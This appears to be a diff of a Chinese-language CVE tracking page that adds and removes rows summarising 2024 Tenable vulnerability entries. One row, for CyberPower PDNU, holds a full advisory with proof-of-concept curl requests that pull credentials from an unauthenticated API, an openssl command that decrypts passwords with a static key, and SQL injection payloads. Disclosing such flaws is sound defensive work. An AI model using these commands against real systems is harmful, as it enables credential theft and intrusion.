@@ -1,4 +1,4 @@
-<!-- RELEASE TIME : 2024-05-11 03:28:31 -->
+<!-- RELEASE TIME : 2024-05-11 07:25:20 -->
 <html lang="zh-cn">
 
  <head>
@@ -235,6 +235,30 @@
        <th width="5%">URL</th>
       </tr>
       <tr>
+       <td>97091980c5e1b8458e4e6fa2fc74838e</td>
+       <td>CVE-2024-34360</td>
+       <td>2024-05-10 00:00:00 <img src="imgs/new.gif" /></td>
+       <td>Nodes can publish ATXs which reference the incorrect previous ATX of the Smesher that created the ATX. ATXs are expected to form a single chain from the newest to the first ATX ever published by an identity. Allowing Smeshers to reference an earlier (but not the latest) ATX as previous breaks this protocol rule and can serve as an attack vector where Nodes are rewarded for holding their PoST data for less than one epoch but still being eligible for rewards.</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-34360">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>f14b094a1f9177dc64e84fdbe5968b5c</td>
+       <td>CVE-2024-34349</td>
+       <td>2024-05-10 00:00:00 <img src="imgs/new.gif" /></td>
+       <td>There is a possibility to execute javascript code in the Admin panel. In order to perform an XSS attack input a script into Name field in which of the resources: Taxons, Products, Product Options or Product Variants. The code will be executed while using an autocomplete field with one of the listed entities in the Admin Panel. Also for the taxons in the category tree on the product form.</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-34349">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>903af0a69e5d47ff38f36d634b501944</td>
+       <td>CVE-2024-32964</td>
+       <td>2024-05-10 00:00:00 <img src="imgs/new.gif" /></td>
+       <td>SSRF ,All users will be impacted.</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-32964">详情</a></td>
+      </tr>
+
+      <tr>
        <td>a27d8e91cfe2d5d574808728ad8d7ea1</td>
        <td>CVE-2024-32739</td>
        <td>2024-05-09 14:39:13</td>
@@ -272,6 +296,22 @@
        <td>2024-05-09 14:39:13</td>
        <td>CVE-2024-32735 - Missing Authentication for Critical Function (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)An unauthenticated remote attacker can access the PDNU REST APIs. For example, the attacker can fetch sensitive information (i.e., login credentials) for devices managed by PDNU:curl '&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices' {"status":"success","results":[{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","fwversion":null,"netmask":"255.255.255.0","gateway":" \"192.168.1.1\"","usedhcp":false,"location":null,"name":null,"uptime":null,"code":null,"contact":null,"modifiedtime":null,"account":"admin","passwd":"FDA64FBAD708BA5A3CA9995A1153F4C6","iv":"90CC43284178CF848AA3CFE8C98B337C","canconn":true,"action":null,"ndtype":2}]}The encrypted password used to login (i.e., SSH) to a device can be decrypted with a static key (i.e., 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e):echo -n 'FDA64FBAD708BA5A3CA9995A1153F4C6' | xxd -p -r | openssl aes-256-cbc -d -K 7ea3312f320c78447ff6fd4c51f77a8abb764b20e31aedccfe6b1854f5aa505e -iv 90CC43284178CF848AA3CFE8C98B337C Password123Note that we do not a CyberPower device to be added to PDNU. &nbsp;We simulate "adding a device manually" with:a. Add a row to the devicesecret table in mcu.dbcurl -i -X PUT -H 'Content-Type:application/json' -d '{"ip":"192.168.1.123","mac":"11:22:33:44:55:66","cmd":"submit_after_dry_run","acc":"admin","passwd":"Password123","connectionstatus":true}' "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/devices"b. Using the PDNU web UI, import a file with the following content, this would add a row to the rmcdevice table"Deivce Type","MAC Address","Version","Account","IP Address","DHCP","Time","Result","Up Time","Name","Location","Subnet Mask","Gateway" "2","11:22:33:44:55:66","2.2.7.0","","192.168.1.123","false", "1545027013","101","1348247500","PDU30SWT17ATNET","Server Room","255.255.255.0", "192.168.1.1" CVE-2024-32736 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_utask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public UpdateVerboseStatusResp query_utask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select uaction, ip, mac, ts, reasoningcode from ucontract join utask on ucontract.ucid = utask.contract join utaskresult on utask.utid = utaskresult.task where ucontract.ucid = '%s';", new Object[] { contract_uuid }); return (UpdateVerboseStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:# sqlite_version() = 3.21.0 curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=&amp;uid=1'%20UNION%20select%201,2,3,4,sqlite_version();--" {"status":"finished","results":[{"ip":"2","mac":"3","action":"1","ts":"4","code":"3.21.0"}]}CVE-2024-32737 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_contract_result (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public synchronized UpdateLeanStatusResp query_contract_result(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofupgradedevice, numsuccess, numfailed, modifiedtime from ucontractresult where ucontractresult.contract = '%s';", new Object[] { contract_uuid }); return (UpdateLeanStatusResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/confup?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","result":{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}}CVE-2024-32738 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_lean (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigLeanResp query_ptask_lean(String contract_uuid) throws DataAccessException { String q_str = String.format("select numofdevice, numsuccess, numfailed, modifiedtime from pcontractresult where contract = '%s';", new Object[] { contract_uuid }); return (PdncConfigLeanResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=lean&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"processing":-4,"success":2,"failed":3,"modifiedtime":"3.21.0"}]}CVE-2024-32739 - SQLi in mcu.jar!com.cyberpower.mcu.core.persist.MCUDBHelper.query_ptask_verbose (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)SQLi via user-supplied parameter contract_uuid: public PdncConfigVerboseResp query_ptask_verbose(String contract_uuid) throws DataAccessException { String q_str = String.format("select paction, ip, ts, reasoningcode from pcontract join ptask on pcontract.pcid = ptask.contract join ptaskresult on ptask.ptid = ptaskresult.task where pcontract.pcid = '%s';", new Object[] { contract_uuid }); return (PdncConfigVerboseResp)this.jdbcTemplate.query(q_str, (ResultSetExtractor)new Object(this)); }PoC:curl "&lt;http://&lt;target-host&gt;&gt;:8085/api/v1/ndconfig?mode=&amp;uid=1'%20UNION%20select%201,2,3,sqlite_version();--" {"status":"finished","results":[{"code":"3.21.0","action":"1","ip":"2","ts":"3"}]}&nbsp;</td>
        <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-32735">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>8eb2479f89c57f088e48ef780615db3c</td>
+       <td>CVE-2024-2454</td>
+       <td>2024-05-09 01:38:36</td>
+       <td>Uncontrolled Resource Consumption in GitLab</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-2454">详情</a></td>
+      </tr>
+
+      <tr>
+       <td>35d0cf7a7877afdadfe9ffe99cf8f999</td>
+       <td>CVE-2024-2651</td>
+       <td>2024-05-09 01:38:31</td>
+       <td>Uncontrolled Resource Consumption in GitLab</td>
+       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-2651">详情</a></td>
       </tr>
 
       <tr>
@@ -384,46 +424,6 @@
        <td>2024-05-08 16:15:08</td>
        <td>RuvarOA v6.01 and v12.01 were discovered to contain a SQL injection vulnerability via the PageID parameter at /WebUtility/SearchCondiction.aspx.</td>
        <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-25531">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>8c53135663c216f47554532f107d4859</td>
-       <td>CVE-2024-25530</td>
-       <td>2024-05-08 16:15:08</td>
-       <td>RuvarOA v6.01 and v12.01 were discovered to contain a SQL injection vulnerability via the PageID parameter at /WebUtility/get_find_condiction.aspx.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-25530">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>ee4d6349ce5e5820111c2f9faf97110a</td>
-       <td>CVE-2024-4418</td>
-       <td>2024-05-08 03:15:07</td>
-       <td>A race condition leading to a stack use-after-free flaw was found in libvirt. Due to a bad assumption in the virNetClientIOEventLoop() method, the `data` pointer to a stack-allocated virNetClientIOEventData structure ended up being used in the virNetClientIOEventFD callback while the data pointer's stack frame was concurrently being "freed" when returning from virNetClientIOEventLoop(). The 'virtproxyd' daemon can be used to trigger requests. If libvirt is configured with fine-grained access control, this issue, in theory, allows a user to escape their otherwise limited access. This flaw allows a local, unprivileged user to access virtproxyd without authenticating. Remote users would need to authenticate before they could access it.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-4418">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>e4aa475ad5c994cbd6aaadbbc024b14b</td>
-       <td>CVE-2024-4393</td>
-       <td>2024-05-08 03:15:07</td>
-       <td>The Social Connect plugin for WordPress is vulnerable to authentication bypass in versions up to, and including, 1.2. This is due to insufficient verification on the OpenID server being supplied during the social login through the plugin. This makes it possible for unauthenticated attackers to log in as any existing user on the site, such as an administrator, if they have access to the email.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-4393">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>4fa9d1071d1d5f6ae3d0b1278b123840</td>
-       <td>CVE-2024-4162</td>
-       <td>2024-05-08 03:15:06</td>
-       <td>A buffer error in Panasonic KW Watcher versions 1.00 through 2.83 may allow attackers malicious read access to memory.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-4162">详情</a></td>
-      </tr>
-
-      <tr>
-       <td>acb1dd99034b22e19bbceb314bbd00db</td>
-       <td>CVE-2024-2860</td>
-       <td>2024-05-08 02:15:09</td>
-       <td>The PostgreSQL implementation in Brocade SANnav versions before 2.3.0a is vulnerable to an incorrect local authentication flaw. An attacker accessing the VM where the Brocade SANnav is installed can gain access to sensitive data inside the PostgreSQL database.</td>
-       <td><a target="_blank" href="https://www.tenable.com/cve/CVE-2024-2860">详情</a></td>
       </tr>
 
      </tbody>
